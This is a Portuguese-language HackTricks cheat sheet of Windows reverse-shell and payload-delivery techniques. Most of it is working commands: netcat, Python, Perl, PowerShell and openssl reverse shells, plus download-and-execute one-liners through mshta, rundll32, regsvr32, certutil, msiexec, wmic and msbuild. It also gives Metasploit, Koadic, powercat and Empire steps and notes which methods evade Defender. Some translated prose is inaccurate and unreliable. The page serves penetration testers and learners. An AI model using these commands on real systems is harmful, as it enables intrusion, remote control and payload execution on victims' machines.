# Shells - Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais sobre bugs web3

🔔 Receba notificações sobre novos programas de recompensas por bugs

💬 Participe de discussões na comunidade

## Lolbas

A página [lolbas-project.github.io](https://lolbas-project.github.io/) é para Windows, assim como [https://gtfobins.github.io/](https://gtfobins.github.io/) é para Linux.\
Obviamente, **não há arquivos SUID ou privilégios sudo no Windows**, mas é útil saber **como** alguns **binários** podem ser (abusados) para realizar algum tipo de ação inesperada, como **executar código arbitrário**.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd** é um clone do Netcat, projetado para ser portátil e oferecer criptografia forte. Ele roda em sistemas operacionais tipo Unix e no Microsoft Win32. sbd apresenta criptografia AES-CBC-128 + HMAC-SHA1 (por Christophe Devine), execução de programas (opção -e), escolha de porta de origem, reconexão contínua com atraso e algumas outras características interessantes. sbd suporta apenas comunicação TCP/IP. sbd.exe (parte da distribuição Kali linux: /usr/share/windows-resources/sbd/sbd.exe) pode ser carregado em um computador com Windows como uma alternativa ao Netcat.
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl é uma linguagem de programação interpretada, de propósito geral e de alto nível. É frequentemente usada em tarefas de administração de sistemas e desenvolvimento web. O Perl é conhecido por sua capacidade de processar texto e manipular arquivos de forma eficiente. Ele também possui uma grande variedade de módulos disponíveis para facilitar o desenvolvimento de aplicativos. O Perl é uma ferramenta útil para hackers, pois pode ser usado para escrever scripts de automação e realizar tarefas de penetração de rede.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby é uma linguagem de programação dinâmica, orientada a objetos e de propósito geral. É frequentemente usada para desenvolvimento web e scripting. O Ruby é conhecido por sua sintaxe simples e elegante, o que torna a escrita de código mais fácil e agradável. Além disso, o Ruby tem uma grande comunidade de desenvolvedores que criam bibliotecas e frameworks para facilitar o desenvolvimento de aplicativos.
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua é uma linguagem de programação leve, rápida e fácil de aprender. É frequentemente usada em jogos, aplicativos móveis e outras aplicações que exigem desempenho e flexibilidade. Lua é uma linguagem interpretada, o que significa que o código é executado diretamente, sem a necessidade de compilação prévia. Além disso, Lua é altamente extensível, permitindo que os usuários adicionem facilmente novas funcionalidades à linguagem.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Atacante (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Vítima
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell é uma ferramenta de linha de comando e linguagem de script desenvolvida pela Microsoft para gerenciamento de sistemas Windows. É uma ferramenta poderosa para hackers, pois permite a execução de comandos e scripts de forma automatizada e eficiente.

### Executando scripts

Para executar um script Powershell, basta abrir o Powershell e digitar o caminho para o arquivo do script. Por exemplo:

```
C:\Users\Hacker\Documents\script.ps1
```

### Executando comandos

Para executar um comando Powershell, basta digitar o comando diretamente no prompt do Powershell. Por exemplo:

```
Get-Process
```

### Escalonamento de privilégios

O Powershell pode ser usado para escalonamento de privilégios em sistemas Windows. Por exemplo, se um usuário comum tiver acesso ao Powershell, ele pode usar o comando `Start-Process` para executar um programa com privilégios de administrador.

### Download e execução de arquivos

O Powershell pode ser usado para baixar e executar arquivos maliciosos em um sistema Windows. Por exemplo, o comando `Invoke-WebRequest` pode ser usado para baixar um arquivo da internet e o comando `Invoke-Expression` pode ser usado para executar o arquivo baixado.

### Bypass de antivírus

O Powershell pode ser usado para contornar a detecção de antivírus em sistemas Windows. Por exemplo, o comando `Invoke-Obfuscation` pode ser usado para ofuscar um script Powershell e torná-lo mais difícil de ser detectado pelo antivírus.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Processo realizando chamada de rede: **powershell.exe**\
Carga gravada no disco: **NÃO** (_pelo menos em nenhum lugar que eu pudesse encontrar usando o procmon!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

**Linha única:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
## Mshta

Obtenha mais informações sobre diferentes Shells do Powershell no final deste documento.
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
Processo realizando chamada de rede: **mshta.exe**\
Carga gravada no disco: **cache local do IE**
```bash
mshta http://webserver/payload.hta
```
Processo realizando chamada de rede: **mshta.exe**\
Carga gravada no disco: **cache local do IE**
```bash
mshta \\webdavserver\folder\payload.hta
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

#### **Exemplo de shell reverso hta-psh (usa hta para baixar e executar backdoor PS)**
```markup
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Você pode baixar e executar facilmente um zombie Koadic usando o stager hta**

#### Exemplo hta
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
        var c = "cmd.exe /c calc.exe"; 
        new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

A técnica `mshta - sct` é uma técnica de execução de código malicioso que utiliza o utilitário `mshta.exe` do Windows para executar um arquivo `.sct` (Scriptlet Text) que contém código VBScript ou JScript malicioso. O arquivo `.sct` é baixado de um servidor remoto e executado localmente pelo `mshta.exe`. Essa técnica é útil para contornar as restrições de execução de scripts do Windows, pois o `mshta.exe` é um aplicativo confiável do Windows e não é bloqueado por padrão pelos softwares antivírus.

Para executar um arquivo `.sct` usando o `mshta.exe`, você pode usar o seguinte comando:

```
mshta.exe "http://remote_server/file.sct"
```

O arquivo `.sct` pode conter código malicioso que pode ser usado para executar comandos no sistema comprometido, baixar e executar arquivos adicionais, roubar informações do sistema e muito mais. É importante notar que essa técnica requer que o sistema comprometido tenha acesso à Internet para baixar o arquivo `.sct` do servidor remoto.
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

O `mshta` é um utilitário do Windows que permite a execução de arquivos HTML como aplicativos. O Metasploit tem um módulo que permite a execução de payloads em um arquivo HTML usando o `mshta`. 

O primeiro passo é gerar o payload com o Metasploit:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<SEU_IP> LPORT=<SUA_PORTA> -f exe > payload.exe
```

Em seguida, crie um arquivo HTML que execute o payload:

```html
<html>
<head>
<script>
    var r = new ActiveXObject("WScript.Shell").Run("payload.exe",0,true);
</script>
</head>
<body>
</body>
</html>
```

Salve o arquivo HTML e inicie um servidor HTTP para servir o arquivo:

```
python -m SimpleHTTPServer 80
```

Por fim, execute o payload usando o `mshta`:

```
mshta http://<SEU_IP>/payload.html
```
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Detectado pelo defensor**

## **Rundll32**

[**Exemplo de DLL hello world**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
Processo realizando chamada de rede: **rundll32.exe**\
Carga útil gravada no disco: **cache local do IE**

**Detectado pelo Defender**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

O Metasploit tem um módulo que permite executar um payload através do comando `rundll32`. O payload é executado através da chamada da função `DllMain` do DLL especificado. O módulo é chamado `exploit/windows/local/hijack_rundll`.

Para usar este módulo, primeiro é necessário gerar um payload com o Metasploit. Em seguida, é necessário carregar o payload em um servidor web e iniciar o servidor. Depois disso, é necessário configurar o módulo `exploit/windows/local/hijack_rundll` com o URL do servidor web e o nome do arquivo DLL que contém o payload.

Uma vez que o módulo esteja configurado, basta executá-lo para que o payload seja executado através do comando `rundll32`.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

O Koadic é um RAT (Remote Access Trojan) que pode ser executado usando o Rundll32. Isso significa que você pode executar o Koadic sem precisar de um arquivo executável separado. 

Para fazer isso, você precisa criar um arquivo .dll que contenha o código do Koadic e, em seguida, usar o Rundll32 para executar esse arquivo. O comando para fazer isso é o seguinte:

```
rundll32.exe <nome_do_arquivo.dll>,<nome_da_função> <argumentos>
```

O `<nome_do_arquivo.dll>` é o nome do arquivo .dll que você criou. O `<nome_da_função>` é o nome da função que você deseja executar dentro do arquivo .dll. E `<argumentos>` são quaisquer argumentos que você deseja passar para a função.

Por exemplo, se você criou um arquivo chamado `payload.dll` que contém o código do Koadic e deseja executar a função `main` com o argumento `192.168.1.100`, o comando seria o seguinte:

```
rundll32.exe payload.dll,main 192.168.1.100
```

Isso executará o Koadic e se conectará ao endereço IP `192.168.1.100`.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

Regsvr32 é um utilitário do Windows que permite registrar e desregistrar bibliotecas de vínculo dinâmico (DLLs) e controles ActiveX no registro do sistema. Isso pode ser usado por um invasor para executar código malicioso em um sistema comprometido. O Regsvr32 pode ser usado para executar um arquivo .sct malicioso que pode ser usado para baixar e executar um payload malicioso.
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
Processo realizando chamada de rede: **regsvr32.exe**\
Carga gravada no disco: **cache local do IE**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

**Detectado pelo Defender**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration 
    progid="PoC"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("calc.exe");    
        ]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

O módulo `regsvr32` do Metasploit permite que um invasor execute um payload arbitrário através do registro do Windows. O payload é executado quando o `regsvr32` é executado com o caminho para uma DLL maliciosa. Este método é útil quando o invasor não tem permissões elevadas, mas pode registrar DLLs.

##### **Uso básico**

```
use exploit/windows/local/regsvr32
set payload windows/meterpreter/reverse_tcp
set lhost <your IP>
set lport <your port>
set srvhost <your IP>
set srvport <your port>
set target <target number>
set dllhost <dllhost.exe path>
set dllpath <dll path>
run
```

##### **Parâmetros**

- `payload`: O payload a ser executado.
- `lhost`: O endereço IP do ouvinte.
- `lport`: A porta do ouvinte.
- `srvhost`: O endereço IP do servidor HTTP.
- `srvport`: A porta do servidor HTTP.
- `target`: O número do alvo.
- `dllhost`: O caminho para o `dllhost.exe`.
- `dllpath`: O caminho para a DLL maliciosa.

##### **Exemplo**

```
use exploit/windows/local/regsvr32
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.100
set lport 4444
set srvhost 192.168.1.100
set srvport 80
set target 1
set dllhost C:\Windows\System32\dllhost.exe
set dllpath /root/malicious.dll
run
```
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Você pode baixar e executar facilmente um zombie Koadic usando o stager regsvr**

## Certutil

Baixe um arquivo B64dll, decodifique-o e execute-o.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Baixe um arquivo B64exe, decodifique-o e execute-o.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Detectado pelo defensor**

***

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais sobre bugs web3

🔔 Receba notificações sobre novas recompensas por bugs

💬 Participe de discussões na comunidade

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

O `cscript` é um interpretador de comandos do Windows que permite a execução de scripts em VBScript e JScript. O Metasploit tem um módulo que permite a execução de comandos `cscript` em um shell remoto do Windows. Isso pode ser útil para executar scripts maliciosos em um alvo comprometido.

Para usar o módulo `cscript` do Metasploit, primeiro é necessário estabelecer uma sessão de shell remoto no alvo. Em seguida, o módulo pode ser carregado com o comando `use windows/manage/cscript` e as opções necessárias podem ser configuradas. Por exemplo, o caminho para o script a ser executado pode ser especificado com a opção `SCRIPTPATH`.

Uma vez que o módulo esteja configurado corretamente, o comando `run` pode ser usado para executar o script no alvo. O resultado da execução do script será exibido no console do Metasploit.

É importante lembrar que a execução de scripts maliciosos em um alvo comprometido pode ser ilegal e antiético. O uso do módulo `cscript` do Metasploit deve ser feito apenas para fins de teste em ambientes controlados e com autorização prévia.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Detectado pelo defensor**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
## **Detectado pelo defensor**

## **MSIExec**

Atacante
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Vítima:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Detectado**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
Processo realizando chamada de rede: **wmic.exe**\
Carga gravada no disco: **cache local do IE**

Exemplo de arquivo xsl:
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
        ]]>
    </ms:script>
</stylesheet>
```
Extraído daqui (https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

**Não detectado**

**Você pode baixar e executar facilmente um zombie Koadic usando o stager wmic**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

Você pode usar essa técnica para contornar a lista de permissões de aplicativos e as restrições do Powershell.exe. Como você será solicitado com um shell PS.\
Basta baixar e executar isso: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Não detectado**

## **CSC**

Compilar código C# na máquina da vítima.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Você pode baixar um shell reverso básico em C# aqui: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Não detectado**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **cache local do cliente WebDAV**

**Eu não tentei**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **cache local do cliente WebDAV**

**Eu não tentei**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Shells do Powershell

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Na pasta **Shells**, há muitas shells diferentes. Para baixar e executar o Invoke-_PowerShellTcp.ps1_, faça uma cópia do script e adicione ao final do arquivo:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Comece a servir o script em um servidor web e execute-o no final da vítima:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
O Defender ainda não detecta o código como malicioso (até 3/04/2019).

**TODO: Verificar outros shells do nishang**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Baixe, inicie um servidor web, inicie o ouvinte e execute-o na máquina da vítima:
```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
O Defender não detecta isso como código malicioso (ainda, 3/04/2019).

**Outras opções oferecidas pelo powercat:**

Shell de ligação, shell reverso (TCP, UDP, DNS), redirecionamento de porta, upload/download, gerar payloads, servir arquivos...
```
Serve a cmd Shell:
    powercat -l -p 443 -e cmd
Send a cmd Shell:
    powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
    powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
    powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
    powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
    powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
    powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Crie um lançador do powershell, salve-o em um arquivo e faça o download e execute-o.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Detectado como código malicioso**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Crie uma versão do backdoor do metasploit em powershell usando o unicorn.
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Inicie o msfconsole com o recurso criado:
```
msfconsole -r unicorn.rc
```
Inicie um servidor web servindo o arquivo _powershell\_attack.txt_ e execute no alvo:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Detectado como código malicioso**

## Mais

[PS>Attack](https://github.com/jaredhaight/PSAttack) Console PS com alguns módulos ofensivos PS pré-carregados (cifrado)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS com alguns módulos ofensivos PS e detecção de proxy (IEX)

## Bibliografia

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais de bugs web3

🔔 Receba notificações sobre novas recompensas por bugs

💬 Participe de discussões na comunidade

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
